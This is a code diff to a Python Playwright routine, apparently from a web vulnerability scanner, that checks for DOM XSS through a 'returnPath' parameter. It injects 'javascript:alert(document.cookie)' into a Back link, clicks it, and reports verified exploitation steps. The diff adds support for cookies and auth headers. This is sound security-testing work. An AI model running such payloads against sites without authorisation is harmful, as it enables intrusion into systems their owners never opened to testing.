@@ -69,6 +69,7 @@ def check_returnpath_dom_xss(
     base_url: str,
     feedback_path: Optional[str] = None,
     timeout_s: int = 12,
+    headers: Optional[Dict[str, str]] = None,
     headed: bool = False,
     slow_mo_ms: int = 0,
 ) -> Optional[Dict]:
@@ -80,69 +81,75 @@ def check_returnpath_dom_xss(
     token = _random_token(10)
     with sync_playwright() as p:
         browser = p.chromium.launch(headless=not headed, slow_mo=slow_mo_ms)
-        page = browser.new_page()
+        # Use a context so we can attach per-request headers (cookies/auth) safely.
+        context = browser.new_context(extra_http_headers=headers or None)
+        page = context.new_page()
+        try:
+            if not feedback_path:
+                feedback_path = _discover_feedback_path(page, base_url, timeout_s)
 
-        if not feedback_path:
-            feedback_path = _discover_feedback_path(page, base_url, timeout_s)
+            url_check = _build_url(base_url, feedback_path, f"/{token}")
+            page.goto(url_check, wait_until="domcontentloaded", timeout=timeout_s * 1000)
+            page.wait_for_timeout(500)
 
-        url_check = _build_url(base_url, feedback_path, f"/{token}")
-        page.goto(url_check, wait_until="domcontentloaded", timeout=timeout_s * 1000)
-        page.wait_for_timeout(500)
+            back_link = _find_back_link(page, token, timeout_s)
+            if back_link is None:
+                return None
 
-        back_link = _find_back_link(page, token, timeout_s)
-        if back_link is None:
-            browser.close()
-            return None
+            href = back_link.get_attribute("href") or ""
+            if token not in href:
+                return None
 
-        href = back_link.get_attribute("href") or ""
-        if token not in href:
-            browser.close()
-            return None
+            url_xss = _build_url(base_url, feedback_path, "javascript:alert(document.cookie)")
+            page.goto(url_xss, wait_until="domcontentloaded", timeout=timeout_s * 1000)
+            page.wait_for_timeout(500)
 
-        url_xss = _build_url(base_url, feedback_path, "javascript:alert(document.cookie)")
-        page.goto(url_xss, wait_until="domcontentloaded", timeout=timeout_s * 1000)
-        page.wait_for_timeout(500)
+            back_link = _find_back_link(page, "javascript:", timeout_s)
+            if back_link is None:
+                return None
 
-        back_link = _find_back_link(page, "javascript:", timeout_s)
-        if back_link is None:
-            browser.close()
-            return None
+            triggered = {"dialog": False}
 
-        triggered = {"dialog": False}
+            def on_dialog(dialog):
+                triggered["dialog"] = True
+                try:
+                    dialog.dismiss()
+                except Exception:
+                    pass
 
-        def on_dialog(dialog):
-            triggered["dialog"] = True
+            page.on("dialog", on_dialog)
+            back_link.click(timeout=timeout_s * 1000)
+            page.wait_for_timeout(1000)
+
+            if not triggered["dialog"]:
+                return None
+
+            return {
+                "type": "dom_xss",
+                "method": "GET",
+                "parameter": "returnPath",
+                "payload": "javascript:alert(document.cookie)",
+                "url": url_xss,
+                "severity": "high",
+                "description": "DOM XSS via returnPath reflected into href and executed on Back click (browser verified)",
+                "context": "href javascript: URL",
+                "verified": True,
+                "exploitation": {
+                    "browser_steps": [
+                        f"Open: {url_check}",
+                        "Verify the returnPath token is reflected inside the Back link href",
+                        f"Open: {url_xss}",
+                        "Click the Back link",
+                        "Observe an alert dialog (document.cookie)",
+                    ]
+                },
+            }
+        finally:
             try:
-                dialog.dismiss()
+                context.close()
             except Exception:
                 pass
-
-        page.on("dialog", on_dialog)
-        back_link.click(timeout=timeout_s * 1000)
-        page.wait_for_timeout(1000)
-        browser.close()
-
-        if not triggered["dialog"]:
-            return None
-
-        return {
-            "type": "dom_xss",
-            "method": "GET",
-            "parameter": "returnPath",
-            "payload": "javascript:alert(document.cookie)",
-            "url": url_xss,
-            "severity": "high",
-            "description": "DOM XSS via returnPath reflected into href and executed on Back click (browser verified)",
-            "context": "href javascript: URL",
-            "verified": True,
-            "exploitation": {
-                "browser_steps": [
-                    f"Open: {url_check}",
-                    "Verify the returnPath token is reflected inside the Back link href",
-                    f"Open: {url_xss}",
-                    "Click the Back link",
-                    "Observe an alert dialog (document.cookie)",
-                ]
-            },
-        }
-
+            try:
+                browser.close()
+            except Exception:
+                pass
